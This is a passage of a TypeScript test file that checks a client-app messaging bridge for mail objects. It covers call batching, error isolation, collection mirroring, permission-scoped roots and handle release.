  test("Calls of one tick go to the app in one message (O6)", async () => {
    let { bridge, client } = await clientSetup();
    let proxy = await context(bridge, client, new TMessage(), bridge.newGrant(["message", "mail"]));
    let receive = vi.spyOn(bridge as any, "receive");
    let results = await Promise.all(Array.from({ length: 500 }, (_, i) => proxy.count(i)));
    expect(results[499]).toBe(499);
    expect(receive).toHaveBeenCalledTimes(1);
    expect(receive.mock.calls[0][0]).toHaveLength(500);
  });

  test("Replies of one tick come in one message (O6)", async () => {
    let { bridge, client } = await clientSetup();
    let proxy = await context(bridge, client, new TMessage(), bridge.newGrant(["message", "mail"]));
    let post = vi.spyOn(bridge.port, "postMessage");
    await Promise.all(Array.from({ length: 500 }, (_, i) => proxy.count(i)));
    expect(post).toHaveBeenCalledTimes(1);
  });

  test("A failing call fails only its own promise", async () => {
    let { bridge, client } = await clientSetup();
    let proxy = await context(bridge, client, new TMessage(), bridge.newGrant(["message", "mail"]));
    let results = await Promise.allSettled([proxy.count(1), proxy.count(NaN), proxy.fail(), proxy.count(2)]);
    expect(results.map(result => result.status)).toEqual(["fulfilled", "rejected", "rejected", "fulfilled"]);
  });

  test("Collections mirror the app collection", async () => {
    let { bridge, client, mustang } = await clientSetup(["message", "mail", "mail.all"]);
    let account = new TAccount();
    let folder = new TFolder();
    account.folders.add(folder);
    for (let i = 0; i < 1500; i++) {
      folder.messages.add(new TMessage());
    }
    let message = new TMessage();
    message.folder = folder;
    let proxy = await context(bridge, client, message, bridge.newGrant(["message", "mail", "mail.all"]));
    let messages = proxy.folder.messages;
    expect(messages.length).toBe(0);
    await mustang.loaded(messages);
    expect(messages.length).toBe(1500);
    let added = new TMessage();
    added.subject = "New";
    folder.messages.add(added);
    folder.messages.remove(folder.messages.getIndex(0));
    await tick(20);
    expect(messages.length).toBe(1500);
    expect(messages.getIndex(1499).subject).toBe("New");
  });

  test("Roots", async () => {
    let { bridge, port } = newBridge(["message", "mail", "mail.all"]);
    let client = new TestClient();
    client.start(port);
    let accounts = new ArrayColl([new TAccount()]);
    bridge.setRoot("mail", "mail.all", accounts, bridge.newGrant(["message", "mail", "mail.all"]));
    bridge.start({ name: "Test", version: "1" });
    await client.whenInitialized();
    expect(client.mustang.mail.accounts.getIndex(0).name).toBe("Account");
    expect(() => client.mustang.chat.accounts).toThrow("chat.all");
    bridge.close();
    port.close();
  });

  test("release() and garbage collection release the handle in the app", async () => {
    let { bridge, client } = await clientSetup();
    let message = new TMessage();
    let proxy = await context(bridge, client, message, bridge.newGrant(["message", "mail"]));
    let before = bridge.handles.size;
    proxy.release();
    expect(() => proxy.subject).toThrow("released");
    await tick(20);
    expect(bridge.handles.size).toBeLessThan(before);
    let gc = (globalThis as any).gc;
    if (!gc) {
      return;
    }
    let grant = bridge.newGrant(["message", "mail"]);
    for (let i = 0; i < 100; i++) {
      bridge.notify("test", "give", { object: new TMessage() }, grant);
    }
    await tick(20);
    let withGarbage = bridge.handles.size;
    gc();
    await tick(50);
    expect(bridge.handles.size).toBeLessThan(withGarbage);
  });
});
